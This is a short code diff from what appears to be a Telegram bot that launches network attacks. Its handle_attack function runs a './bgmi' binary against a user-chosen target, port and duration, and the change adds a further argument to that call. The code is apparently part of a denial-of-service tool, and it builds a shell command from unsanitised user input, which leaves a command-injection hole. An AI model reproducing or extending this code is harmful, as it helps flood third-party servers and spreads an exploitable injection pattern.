@@ -96,7 +96,7 @@ def handle_attack(message):
 
     # Attack Execution
     try:
-        subprocess.run(f"./bgmi {target} {port} {time_duration}", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
     except subprocess.CalledProcessError:
